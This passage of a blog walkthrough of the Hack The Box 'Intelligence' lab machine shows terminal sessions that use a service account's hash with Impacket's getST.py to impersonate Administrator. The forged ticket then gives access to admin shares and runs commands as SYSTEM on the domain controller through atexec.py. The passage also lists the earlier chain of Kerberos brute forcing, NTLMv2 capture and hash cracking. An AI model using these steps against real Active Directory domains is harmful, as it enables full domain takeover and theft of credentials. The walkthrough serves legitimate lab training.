<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence/gMSADumper-main]</span><br><span class="line">└─<span class="comment"># python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator</span></span><br><span class="line">Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br></pre></td></tr></table></figure>

<p>It gives me error for the clock skew which is normal if you are familiar with Active Directory you just have to sync time between the server and machine.<br>So let’s use ntpdate to do that.<br>if you don’t have ntpdate you can install it using</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ntpdate</span><br></pre></td></tr></table></figure>

<p>then run the command</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ntpdate 10.10.10.248</span><br></pre></td></tr></table></figure>

<p>Now the clock skew has been fixed let’s try silver ticket attack again.<br>If the time doesn’t change try the following</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install chrony</span><br><span class="line">sudo timedatectl set-ntp <span class="literal">true</span></span><br><span class="line">sudo ntpdate 10.10.10.248</span><br></pre></td></tr></table></figure>

<p>And now run the command</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence/gMSADumper-main]</span><br><span class="line">└─<span class="comment"># python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator</span></span><br><span class="line">Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">[*]     Requesting S4U2self</span><br><span class="line">[*]     Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator.ccache</span><br></pre></td></tr></table></figure>

<p>Now let’s use that ticket to authenticate.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Intelligence$ smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass </span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"><span class="comment"># shares</span></span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">IPC$</span><br><span class="line">IT</span><br><span class="line">NETLOGON</span><br><span class="line">SYSVOL</span><br><span class="line">Users</span><br><span class="line"><span class="comment"># use Users</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 02:20:26 2021 .</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 02:20:26 2021 ..</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 01:18:39 2021 Administrator</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 04:16:30 2021 All Users</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 03:17:40 2021 Default</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 04:16:30 2021 Default User</span><br><span class="line">-rw-rw-rw-        174  Mon Apr 19 04:15:17 2021 desktop.ini</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 01:18:39 2021 Public</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 02:20:26 2021 Ted.Graves</span><br><span class="line">drw-rw-rw-          0  Mon Apr 19 01:51:46 2021 Tiffany.Molina</span><br><span class="line"><span class="comment"># cd Administrator</span></span><br><span class="line"><span class="comment"># cd Desktop</span></span><br><span class="line"><span class="comment"># get root.txt</span></span><br></pre></td></tr></table></figure>

<p>So now we root so let’s get all the flags.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># cat root.txt                                                                                                                  </span></span><br><span class="line">5a582f5f16388c9959ef6d4b3dcbe914</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2014.jpg"></li>
</ul>
<p>or you can use:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># python3 atexec.py -k -no-pass dc.intelligence.htb &#x27;whoami&#x27;</span></span><br><span class="line">Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[!] This will work ONLY on Windows &gt;= Vista</span><br><span class="line">[*] Creating task \krUvePvx</span><br><span class="line">[*] Running task \krUvePvx</span><br><span class="line">[*] Deleting task \krUvePvx</span><br><span class="line">[*] Attempting to <span class="built_in">read</span> ADMIN$\Temp\krUvePvx.tmp</span><br><span class="line">nt authority\system</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># python3 atexec.py -k -no-pass dc.intelligence.htb &#x27;type C:\Users\Administrator\Desktop\root.txt&#x27;</span></span><br><span class="line">Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[!] This will work ONLY on Windows &gt;= Vista</span><br><span class="line">[*] Creating task \ocxiGfwW</span><br><span class="line">[*] Running task \ocxiGfwW</span><br><span class="line">[*] Deleting task \ocxiGfwW</span><br><span class="line">[*] Attempting to <span class="built_in">read</span> ADMIN$\Temp\ocxiGfwW.tmp</span><br><span class="line">5a582f5f16388c9959ef6d4b3dcbe914</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2015.jpg"></li>
</ul>
<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
<li>SMB enumeration</li>
<li>LDAP enumeration</li>
<li>write python script to batch download and extract data</li>
<li>brute Kerberos by using kerbrute and crackmapexec</li>
<li>add dns record by using krbrelayx’s dnstool then use responder get NTLMv2 Hash</li>
<li>crack NTLMv2 hash with john</li>
<li>use gMSADumper get svc_int’s hash</li>
<li>sync time between the server and machine by using ntpdate and chrony</li>
<li>use getST.py to get Administrator.ccache to perform a Silver Ticket attack</li>
<li>use smbclient.py or atexec.py and Silver Ticket to get user and root flag</li>
</ul>
<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/07/10/intelligence/" title="Hack-The-Box-walkthrough[intelligence]">https://fdlucifer.github.io/2021/07/10/intelligence/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/06/27/explore/" rel="prev" title="Hack-The-Box-walkthrough[explore]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[explore]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/07/12/seal/" rel="next" title="Hack-The-Box-walkthrough[seal]">
                  Hack-The-Box-walkthrough[seal] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">644k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:02</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
